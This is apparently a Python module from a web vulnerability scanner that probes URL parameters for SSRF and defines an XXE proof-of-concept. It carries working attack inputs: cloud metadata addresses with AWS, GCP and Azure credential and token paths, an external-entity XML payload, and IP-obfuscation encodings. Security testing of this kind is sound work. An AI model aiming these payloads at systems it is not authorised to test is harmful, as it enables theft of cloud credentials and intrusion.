
from __future__ import annotations
import concurrent.futures as _fut
import time
import json
import logging
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urlsplit

# from .base import BaseScanner
# from websecure.core.reporting import add_result
from websecure.core.utils import random_string, ttl_cache_get, ttl_cache_set
from websecure.core.payloads import load_external_payloads

# Smart context analysis
try:
    from websecure.core.input_analyzer import (
        analyze_input_context, 
        should_skip_payload_category,
        format_analysis_log,
        InputContext
    )
    _HAS_ANALYZER = True
except ImportError:
    _HAS_ANALYZER = False

# =============================================================================
#  Configurations
# =============================================================================

@dataclass
class OASTConfig:
    enabled: bool = True
    provider: str = "generic"
    dns_domain: Optional[str] = None
    token_prefix: str = "ws"
    timeout: int = 15
    enable_local_schemes: bool = True
    enable_dict_scheme: bool = False
    enable_tftp_scheme: bool = True
    enable_metadata_probes: bool = True
    timing_threshold: float = 2.0
    base_headers: Dict[str, str] = field(default_factory=dict)
    base_cookies: Dict[str, str] = field(default_factory=dict)

@dataclass
class ScannerTuning:
    concurrency: int = 6
    retries: int = 0
    methods: Tuple[str, ...] = ("GET", "POST")
    user_agent: str = "WebSecure/SSRF-XXE 1.2"
    respect_redirects: bool = True

@dataclass
class SSRFXXEConfig:
    oast: OASTConfig = field(default_factory=OASTConfig)
    tuning: ScannerTuning = field(default_factory=ScannerTuning)

# =============================================================================
#  Helpers & Constants
# =============================================================================

COMMON_URL_PARAMS = [
    "url", "redirect", "next", "dest", "destination", "callback", "u", "return", "return_to",
    "continue", "target", "endpoint", "webhook", "feed", "link", "out", "source", "file", "path",
    "image", "img", "avatar", "download"
]

BODY_URL_KEYS = [
    "url", "webhook", "avatar", "image", "callback", "target", "endpoint", "feed", "source", "file", "path"
]

METADATA_BASES = ["http://169.254.169.254", "http://100.100.100.200"]
AWS_PATHS = [
    "/latest/meta-data/", "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/iam/security-credentials/role-name"
]
GCP_PATHS = ["/computeMetadata/v1/instance/service-accounts/default/token"]
AZURE_PATHS = ["/metadata/instance?api-version=2021-02-01"]

XXE_POC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY ext SYSTEM "{U}"> ]>
<root><v>&ext;</v></root>"""

ERROR_FINGERPRINTS = [
    "connection refused", "timed out", "no route to host", "invalid host",
    "host is unreachable", "could not resolve", "failed to connect"
]

def _encode_ip_variants(ip: str) -> List[str]:
    try:
        a, b, c, d = (int(x) for x in ip.split("."))
        return [
            ip,
            ".".join(f"{p:03o}" for p in (a, b, c, d)), # Octal
            ".".join(f"{p:02x}" for p in (a, b, c, d)), # Hex
            str(a * (256 ** 3) + b * (256 ** 2) + c * 256 + d), # Decimal
            "0x" + "".join(f"{p:02x}" for p in (a, b, c, d)) # Hex single
        ]
    except ValueError:
        return [ip]

def run(ctx):
    """
    Main Entry Point using ScanContext from main.py
    """
    return run_ssrf_xxe_scan(ctx)

def run_ssrf_xxe_scan(ctx):
    """
    Robust SSRF/XXE Scanner entry point.
    Iterates over all endpoints and tests specifically for SSRF/XXE candidates.
    """
    from websecure.core.reporting import add_result
    
    session = ctx.session
    results = getattr(ctx, "results", {})
    discovery = results.get("discovery", {})
    
    # Merge endpoints
    endpoints = set(results.get("endpoints", []))
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)
                
    targets = list(endpoints)
    print(f"[SSRF/XXE] Scanning {len(targets)} endpoints...")
    
    findings = []
    
    # Only test if OAST is possible or blind logic is used
    # For now, simplistic active checks
    # 1. SSRF via query params
    for url in targets:
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)
        if not qs: continue
        
        url_params = [p for p,v in qs if p.lower() in COMMON_URL_PARAMS]
        
        if url_params:
            for param in url_params:
                # Test Metadata Access
                for base in METADATA_BASES:
                    # Construct URL
                    new_qs = []
                    for p, v in qs:
                        if p == param:
                            new_qs.append((p, base))
                        else:
                            new_qs.append((p, v))
                            
                    t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                    try:
                        resp = session.get(t_url, timeout=3)
                        if "ami-id" in resp.text or "instance-id" in resp.text:
                             findings.append({
                                 "type": "SSRF (Cloud Metadata)",
                                 "url": t_url,
                                 "param": param,
                                 "payload": base,
                                 "evidence": "Cloud metadata exposed",
                                 "severity": "Critical"
                             })
                    except: pass
                    
    if findings:
        if "ssrf" in results:
             results["ssrf"].extend(findings)
        else:
             results["ssrf"] = findings
        for f in findings:
             if callable(getattr(ctx, "add_result", None)):
                 ctx.add_result("ssrf", f)

# Alias for main.py dynamic imports
scan = run_ssrf_xxe_scan

class SSRFScanner:
    """Wrapper for backward compatibility."""
    def __init__(self, session, endpoints=None):
        self.session = session
        self.endpoints = endpoints or []
        self.results = {}

    def run(self, url: str = ""):
        # Construct a mock context to reuse run_ssrf_xxe_scan
        class MockCtx:
            def __init__(self, s, r, cps):
                self.session = s
                self.results = r
                self.results["endpoints"] = cps
            def add_result(self, bucket, item):
                if bucket not in self.results: self.results[bucket] = []
                self.results[bucket].append(item)

        # Merge url into endpoints if provided
        eps = list(self.endpoints)
        if url and url not in eps:
            eps.append(url)

        ctx = MockCtx(self.session, self.results, eps)
        run_ssrf_xxe_scan(ctx)

class XXEScanner(SSRFScanner):
    pass
